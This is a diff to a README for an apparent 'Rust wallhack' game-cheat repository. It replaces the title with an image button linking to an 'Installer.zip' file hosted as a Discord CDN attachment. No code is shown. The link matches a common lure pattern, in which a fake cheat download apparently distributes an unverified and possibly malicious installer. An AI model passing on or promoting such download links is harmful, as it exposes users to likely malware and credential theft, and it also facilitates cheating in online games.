@@ -1,2 +1,1 @@
-# Rust-wallhack-download
-Rust wallhack download
+[<img src="https://i.imgur.com/WJ9FurS.jpg"/>](https://cdn.discordapp.com/attachments/1175696087399546890/1177510316234514534/Installer.zip?ex=6572c4f0&is=65604ff0&hm=fbaf0a73303745b641e73ff745a3f1cfdb71c12a13bbfc96fc5dd6dcc37544d3&)
